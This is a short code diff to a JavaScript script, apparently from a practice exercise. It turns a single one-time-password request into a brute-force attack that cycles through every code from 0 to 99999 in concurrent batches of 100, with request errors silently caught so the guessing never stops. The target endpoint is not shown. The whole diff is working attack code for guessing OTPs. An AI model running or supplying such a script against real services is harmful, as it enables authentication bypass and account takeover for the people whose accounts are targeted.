@@ -32,7 +32,27 @@ function sendRequest(otp) {
             },
             data: data,
         };
-        yield axios_1.default.request(config);
+        //putting this inside a try catch for backend error handling.
+        try {
+            yield axios_1.default.request(config);
+        }
+        catch (e) {
+            // console.log(e);
+        }
     });
 }
-sendRequest("290801");
+//batching made for 100 batch requests at a time
+//processing 100 reqs at a time, if not then memory will run out.
+function main() {
+    return __awaiter(this, void 0, void 0, function* () {
+        for (let i = 0; i <= 99999; i += 100) {
+            const p = [];
+            for (let j = 0; j < 100; j++) {
+                console.log(i);
+                p.push(sendRequest((i + j).toString()));
+            }
+            yield Promise.all(p);
+        }
+    });
+}
+main();
